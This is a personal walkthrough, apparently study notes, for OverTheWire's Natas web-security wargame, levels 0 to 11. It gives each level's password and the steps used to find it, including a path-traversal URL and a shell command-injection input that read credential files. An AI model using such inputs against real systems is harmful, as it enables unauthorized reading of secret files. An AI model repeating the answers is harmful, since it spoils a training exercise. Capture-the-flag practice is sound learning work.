---
title: OverTheWire - Natas
---


---

## Natas Level 0  -->  1


Looking the page source code for a password 

![[Pasted image 20260704212259.png]]

```
scfWG6qNEIdzqVyfRwEGXyNUfFZkZeQ7
```


---

## Natas Level 1  -->  2

Looking page Inspector for a password

![[Pasted image 20260704212541.png]]

```
vsDOxoXyq3wckCP1ZmTZ71ngIA606odB
```


---

## Natas Level 2  -->  3

Looking Page Source for a find file path
*File path:*
```
http://natas2.natas.labs.overthewire.org/files/users.txt
```

![[Pasted image 20260704213110.png]]

```
K30JrSRHzjxq3paUQuwozY4MNvmNFyhI
```


---

## Natas Level 3  -->  4

Browes URL:
```
http://natas3.natas.labs.overthewire.org/robots.txt
```

![[Pasted image 20260704215251.png]]

Access URL:
```
http://natas3.natas.labs.overthewire.org/s3cr3t/
```

![[Pasted image 20260704215327.png]]

Read users.txt:
```
http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
```

![[Pasted image 20260704215418.png]]

Level 4 Password :
```
JDrPnuZAKyl6MkiqQGFIddrqpvgOASth
```


---

## Natas Level  4  -->  5

Reload Page and Capture `GET /index.php HTTP/1.1`

![[Pasted image 20260704221014.png]]


Level 5 Password :
```
e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M
```


---

## Natas Level  5  -->  6


![[Pasted image 20260704222716.png]]

Level 6 Password :
```
7mhjtShJAcld2NYbKHEadnhEwRn2P8VT
```


---

## Natas Level  6  -->  7

Check "View Source Code"

![[Pasted image 20260704224930.png]]


Next URL :
```
http://natas6.natas.labs.overthewire.org/includes/secret.inc
```

View Page source:
![[Pasted image 20260704225056.png]]


```
FOEIUWGHFEEUHOFUOIU
```


![[Pasted image 20260704225322.png]]

- Click `Submit secret`

![[Pasted image 20260704225438.png]]

Level 7 Password :
```
B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0
```


---

## Natas Level  7  -->  8

View Page Source of Natas 7

![[Pasted image 20260704231007.png]]

Found path : `/etc/natas_webpass/natas8`

Browes URL : `http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8`

![[Pasted image 20260704231107.png]]

Natas 8 Password 
```
ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc
```



---

## Natas Level  8  --> 9 


![[Pasted image 20260704233946.png]]


Decode Secret key using PHP,

![[Pasted image 20260704234336.png]]

Enter Founded secret key
![[Pasted image 20260704234405.png]]


![[Pasted image 20260704234452.png]]

Natas Level 9 Password :
```
UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9
```



---

## Natas Level 9  -->  10

serch bar:
```
; cat /etc/natas_webpass/natas10
```

![[Pasted image 20260704235519.png]]

Natas level 10 Password :
```
EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv
```


----

## Natas Level  10 -->  11


in the search bar :
```
c /etc/natas_webpass/natas11
```

![[Pasted image 20260714105657.png]]


Natas level 11 Password:
```
VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd
```


---

